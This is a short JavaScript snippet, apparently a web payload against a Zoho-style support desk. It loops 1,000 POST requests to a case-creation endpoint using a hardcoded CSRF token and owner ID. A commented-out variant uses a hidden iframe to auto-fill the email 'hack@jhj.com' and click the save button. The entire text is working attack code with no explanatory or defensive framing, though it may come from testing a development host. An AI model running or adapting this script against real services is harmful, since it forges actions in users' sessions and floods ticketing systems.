//Adding Ticket

// var iframe = jQuery("<iframe></iframe>");
// jQuery(iframe).attr("src","Create.do?module=Cases");
// jQuery(iframe).attr("onload","add_Ticket()");

// jQuery("body").append(iframe);

// function add_Ticket(){
// jQuery(iframe).contents().find("input:text").val('hack@jhj.com') ;
// jQuery(iframe).contents().find('#saveButtonId').click();
// }
for( var i=0 ; i<1000 ; i++){
  jQuery.post("https://supportdev3.localzoho.com/support/nandhalocal/CreateCommonModule.do", { 'rowCount':'1','ActionType':'Create','previousPage':'false','operation':'create', 'property(Department)':'12883000000006907','property(Contact Name)':'dsad','property(newAutoLookup_property(Contact Name)_7)':'true','property(newAutoLookup_property(Account Name)_4)':'false', 'property(Subject)':'dasdas','property(Status)':'Open','property(Case Owner)':'6b28c32dddd03edf8e167a8f8ddd68f8e612657a51fd5fbe', 'property(ownerId)':'6b28c32dddd03edf8e167a8f8ddd68f8e612657a51fd5fbe', 'property(newAutoLookup_property(Product Name)_6)':'false', 'property(Mode)':'Phone','property(module)':'Cases','module':'Cases', 'currentModule':'Cases', 'crmcsrfparam':'5887d8350d66d80fc391aaf7f3b9e5074aea2bd4aee958881032fecc03c25dfd40219ee6101fa0a167ff603ab4818e2bcc23ab52ca13eea5a87c43e9ccc996c7','uhome':'requestqueue'});
}
